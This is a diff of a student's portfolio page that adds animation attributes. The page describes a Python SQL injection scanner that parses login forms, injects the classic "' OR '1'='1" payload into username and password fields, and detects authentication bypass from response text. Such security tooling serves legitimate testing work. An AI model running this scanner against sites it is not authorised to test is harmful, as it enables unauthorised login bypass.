@@ -28,46 +28,46 @@
     </div>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Overview</p>
-      <h2 class="ds-section-title">Project Overview</h2>
-      <p class="ds-body">Automates detection of SQL injection vulnerabilities by parsing web forms, injecting payloads, and analyzing HTTP responses for error signatures or bypass indicators.</p>
-      <div class="ds-pill-row">
-        <span class="ds-pill">Python</span>
-        <span class="ds-pill">BeautifulSoup</span>
-        <span class="ds-pill">Requests</span>
-        <span class="ds-pill">Security</span>
+      <p data-reveal class="ds-section-label">Overview</p>
+      <h2 data-reveal class="ds-section-title">Project Overview</h2>
+      <p data-reveal class="ds-body">Automates detection of SQL injection vulnerabilities by parsing web forms, injecting payloads, and analyzing HTTP responses for error signatures or bypass indicators.</p>
+      <div data-reveal-group class="ds-pill-row">
+        <span data-reveal class="ds-pill">Python</span>
+        <span data-reveal class="ds-pill">BeautifulSoup</span>
+        <span data-reveal class="ds-pill">Requests</span>
+        <span data-reveal class="ds-pill">Security</span>
       </div>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Discovery</p>
-      <h2 class="ds-section-title">Form Discovery</h2>
-      <p class="ds-body">Uses <code>BeautifulSoup</code> to locate forms on the page:</p>
-      <pre class="ds-code-block"><code>resp = s.get(url)
+      <p data-reveal class="ds-section-label">Discovery</p>
+      <h2 data-reveal class="ds-section-title">Form Discovery</h2>
+      <p data-reveal class="ds-body">Uses <code>BeautifulSoup</code> to locate forms on the page:</p>
+      <pre data-reveal class="ds-code-block"><code>resp = s.get(url)
 soup = BeautifulSoup(resp.content, "html.parser")
 forms = soup.find_all("form")</code></pre>
-      <p class="ds-body">Returns each <code>&lt;form&gt;</code> element for further analysis.</p>
+      <p data-reveal class="ds-body">Returns each <code>&lt;form&gt;</code> element for further analysis.</p>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Payloads</p>
-      <h2 class="ds-section-title">Payload Construction</h2>
-      <p class="ds-body">Extracts form details, then builds a data dictionary injecting <code>"' OR '1'='1"</code> into input fields named <code>username</code> or <code>password</code>:</p>
-      <pre class="ds-code-block"><code>for field in details['inputs']:
+      <p data-reveal class="ds-section-label">Payloads</p>
+      <h2 data-reveal class="ds-section-title">Payload Construction</h2>
+      <p data-reveal class="ds-body">Extracts form details, then builds a data dictionary injecting <code>"' OR '1'='1"</code> into input fields named <code>username</code> or <code>password</code>:</p>
+      <pre data-reveal class="ds-code-block"><code>for field in details['inputs']:
     if field['name'].lower() in ('user', 'username', 'password'):
         data[field['name']] = "' OR '1'='1"
     elif field['type']=='hidden' or field['value']:
         data[field['name']] = field['value']
     else:
         data[field['name']] = 'testing'</code></pre>
-      <p class="ds-body">Preserves hidden fields and assigns dummy values to others.</p>
+      <p data-reveal class="ds-body">Preserves hidden fields and assigns dummy values to others.</p>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Execution</p>
-      <h2 class="ds-section-title">Attack Execution &amp; Analysis</h2>
-      <p class="ds-body">Sends the crafted payload via GET or POST and inspects the response body:</p>
-      <pre class="ds-code-block"><code>if method=='post':
+      <p data-reveal class="ds-section-label">Execution</p>
+      <h2 data-reveal class="ds-section-title">Attack Execution &amp; Analysis</h2>
+      <p data-reveal class="ds-body">Sends the crafted payload via GET or POST and inspects the response body:</p>
+      <pre data-reveal class="ds-code-block"><code>if method=='post':
     resp = s.post(action_url, data=data)
 else:
     resp = s.get(action_url, params=data)
@@ -76,25 +76,25 @@ if 'sign off' in body:
     print("Authentication bypass detected")
 else:
     print("No bypass detected")</code></pre>
-      <p class="ds-body">Flags a successful bypass when the response contains known post-login markers (e.g., "Sign Off").</p>
+      <p data-reveal class="ds-body">Flags a successful bypass when the response contains known post-login markers (e.g., "Sign Off").</p>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Learnings</p>
-      <h2 class="ds-section-title">Key Takeaways</h2>
-      <div class="ds-highlight">
+      <p data-reveal class="ds-section-label">Learnings</p>
+      <h2 data-reveal class="ds-section-title">Key Takeaways</h2>
+      <div data-reveal class="ds-highlight">
         <ul>
           <li>Dynamic form parsing with BeautifulSoup for versatile input handling.</li>
           <li>Automated payload injection covering GET/POST scenarios.</li>
           <li>Response analysis using string matching for reliable vulnerability detection.</li>
         </ul>
       </div>
-      <div class="ds-btn-row">
+      <div data-reveal class="ds-btn-row">
         <a href="https://github.com/gurumanie-singh/gurumanie-singh.github.io/tree/main/py-network-experiments/SQLInjectionScanner" target="_blank" rel="noopener noreferrer" class="ds-btn-primary">View Full Code on GitHub</a>
       </div>
     </section>
   </main>
-  <footer class="ds-footer">
+  <footer data-reveal class="ds-footer">
     <span class="ds-footer-logo">Gurumanie Singh Dhiman</span>
     <p class="ds-footer-text">© 2026 · Ames, Iowa · B.S. Computer Engineering</p>
   </footer>
